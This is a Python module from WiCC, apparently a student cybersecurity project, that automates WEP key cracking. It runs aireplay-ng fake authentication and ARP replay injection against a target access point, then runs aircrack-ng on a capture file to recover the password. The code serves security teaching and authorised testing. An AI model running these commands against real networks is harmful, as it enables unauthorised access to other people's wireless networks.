#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
    WiCC (Wireless Cracking Camp)
    GUI tool for wireless cracking on WEP and WPA/WPA2 networks.
    Project developed by Pablo Sanz Alguacil and Miguel Yanes Fernández, as the Group Project for the 3rd year of the
    Bachelor of Sicence in Computing in Digital Forensics and CyberSecurity, at TU Dublin - Blanchardstown Campus
"""

from wicc_enc_type import EncryptionType
import time
import threading

class WEP(EncryptionType):
    def __init__(self, network, interface, mac):
        EncryptionType.__init__(self, network, interface)
        # super().__init__(self, network, interface)
        self.mac = mac

    def scan_network(self, write_directory):
        super(WEP, self).scan_network(write_directory)

        fakeauth_cmd = ['aireplay-ng', '--fakeauth', '0', '-a', self.mac, '-e', self.essid, '-T', '3', self.interface]
        arpreplay_cmd = ['aireplay-ng', '--arpreplay', '-b', self.bssid, '-h', self.mac,
                        '--ignore-negative-one', self.interface]

        #fakeauth_out, err = self.execute_command(fakeauth_cmd)
        #print(fakeauth_out.decode('utf-8'))

        arpreplay_thread = threading.Thread(target=self.execute_command, args=(arpreplay_cmd,))
        arpreplay_thread.start()
        arpreplay_thread.join(0)

        print("running aireplay thread on mac: " + self.mac)
    def crack_network(self):
        aircrack_cmd = ['aircrack-ng', '/tmp/WiCC/net_attack-01.cap']
        print("will execute aircrack")
        crack_out, crack_err = super().execute_command(aircrack_cmd)
        print("finished aircrack")
        # will need to filter the output from aircrack
        password = self.filter_aircrack(crack_out.decode('utf-8'))
        return password
